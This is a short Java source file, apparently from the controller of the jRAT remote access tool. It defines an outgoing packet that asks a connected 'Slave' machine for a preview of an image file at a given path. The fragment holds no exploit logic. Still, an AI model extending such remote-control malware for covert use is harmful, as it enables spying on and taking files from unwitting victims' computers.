package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet62PreviewImage extends AbstractOutgoingPacket {

	private String file;

	public Packet62PreviewImage(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 62;
	}

}
